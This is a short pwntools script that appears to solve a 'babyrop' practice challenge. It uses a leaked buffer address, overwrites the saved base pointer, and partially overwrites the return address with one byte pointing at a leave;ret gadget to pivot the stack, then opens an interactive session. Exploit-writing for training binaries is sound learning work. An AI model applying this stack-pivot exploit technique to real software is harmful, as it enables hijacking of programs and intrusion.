from pwn import *

p = process("./babyrop_level11.0")

context.terminal = ['tmux',"splitw",'-h']

p.recvuntil(b"[LEAK] Your input buffer is located at: ")

leak = int(p.recvline().decode().split('.')[0],16)

log.success(leak)

payload = b"A" * 24 + p64(leak-16) + b'\x4b'

#   0x000055555555644b <+182>:   leave
#   0x000055555555644c <+183>:   ret


p.send(payload)

p.interactive()
